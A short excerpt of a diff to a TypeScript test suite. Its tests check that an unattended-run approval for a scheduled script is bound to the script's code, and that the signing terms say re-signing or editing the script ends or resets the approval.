     const { script: _dropped, ...bare } = signed.grant.terms.triggers[0]!;
     const terms = { ...signed.grant.terms, triggers: [bare] };
@@ -561,7 +635,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
     expect(activeUnattendedGrant(store, flow, at(HOUR))).toBeNull();
   });
 
-  test("the signing terms say a renewal sends waiting work back, and a script edit ends it", () => {
+  test("the signing terms say a renewal sends waiting work back, and a script edit ends it", async () => {
     expect(UNATTENDED_RULE_WORDS).toEqual(expect.arrayContaining([
       "Signing again replaces it: work it approved that hasn't started goes back to waiting for you.",
       expect.stringContaining("a script they run or a project file it imports"),
